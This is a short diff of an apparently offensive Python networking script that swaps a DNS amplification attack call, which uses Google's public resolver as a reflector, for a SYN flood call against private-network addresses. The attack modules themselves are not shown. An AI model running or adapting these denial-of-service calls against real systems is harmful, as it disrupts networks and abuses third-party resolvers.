@@ -4,6 +4,7 @@ import socket
 import struct
 
 from DnsAmplification import DnsAmplificationAttack
+from SynFlood import SynFloodAttack
 
 def GetBinaryIP(IP):
 	try:
@@ -45,7 +46,8 @@ def CheckOpenTcpPort(IP, PORT):
     	return False
 def main():
 
-	DnsAmplificationAttack('192.168.1.14', 1111, '8.8.8.8', 53, "www.ynet.co.il")
+	# DnsAmplificationAttack('192.168.1.14', 1111, '8.8.8.8', 53, "www.ynet.co.il")
+	SynFloodAttack('192.168.1.14','192.168.1.1')
 	HTTP_PORT = 80
 	SSH_PORT = 22
 	FTP_PORT = 21
